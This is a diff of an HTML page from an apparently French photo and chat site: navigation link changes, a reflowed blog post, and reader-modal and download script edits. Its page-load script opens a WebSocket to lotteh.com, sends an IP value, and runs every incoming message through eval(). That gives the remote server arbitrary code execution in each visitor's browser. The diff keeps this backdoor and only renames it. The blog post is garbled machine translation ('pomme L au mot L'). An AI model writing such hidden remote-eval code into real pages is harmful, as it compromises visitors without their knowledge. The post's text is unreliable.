@@ -65,7 +65,7 @@
               <a class="nav-link" href="/fr/landing" title="Visitez la page de destination">Atterrissage</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Chat vidéo">Chat</a>
+              <a class="nav-link" href="/fr/chat" title="Chat vidéo">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/fr/private" title="Voir des photos privées avec une clé">Privé</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyPhoto de profil" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Par Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Pourquoi devrais-je utiliser une Apple L Out sur le mot L? </p> <p> <br> </p> <p> L'utilisation d'une pomme L au L Word peut améliorer votre expérience de visualisation de plusieurs manières.L'Apple L est un périphérique de streaming populaire qui vous permet d'accéder et de regarder facilement vos émissions préférées avec des vidéos et des audio de haute qualité.En utilisant une pomme L au L Word, vous pouvez profiter de visuels nets et clairs et de son immersif qui vous donnera l'impression d'être en plein milieu de l'action. </p> <p> <br> </ p> <p> De plus, l'Apple L propose une interface conviviale qui facilite la navigation dans les épisodes, la pause et le rembobinage, et personnaliser votre expérience de visualisation.Vous pouvez également profiter de fonctionnalités telles que la recherche vocale et des recommandations personnalisées pour vous aider à découvrir un nouveau contenu à apprécier. </p> <p> <br> </p> <p> Dans l'ensemble, en utilisant une pomme L au l mot peutvous offrir une expérience de streaming premium qui vous permettra de vous immerger pleinement dans le monde captivant du spectacle. </p></div>
+<div style="white-space: pre-wrap;"><p>Pourquoi devrais-je utiliser une pomme L au mot L?</p><p><br/></p><p>L'utilisation d'une pomme L au L Word peut améliorer votre expérience de visualisation de plusieurs manières. L'Apple L est un périphérique de streaming populaire qui vous permet d'accéder et de regarder facilement vos émissions préférées avec des vidéos et des audio de haute qualité. En utilisant une pomme L au L Word, vous pouvez profiter de visuels nets et clairs et de son immersif qui vous donnera l'impression d'être en plein milieu de l'action.</p><p><br/></p><p>De plus, l'Apple L propose une interface conviviale qui facilite la navigation dans les épisodes, les scènes de pause et de rembobinage et de personnaliser votre expérience de visualisation. Vous pouvez également profiter de fonctionnalités telles que la recherche vocale et des recommandations personnalisées pour vous aider à découvrir de nouveaux contenus pour en profiter.</p><p><br/></p><p>Dans l'ensemble, l'utilisation d'une Apple L au L Word peut vous offrir une expérience de streaming premium qui vous permettra de vous immerger pleinement dans le monde captivant du spectacle.</p></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
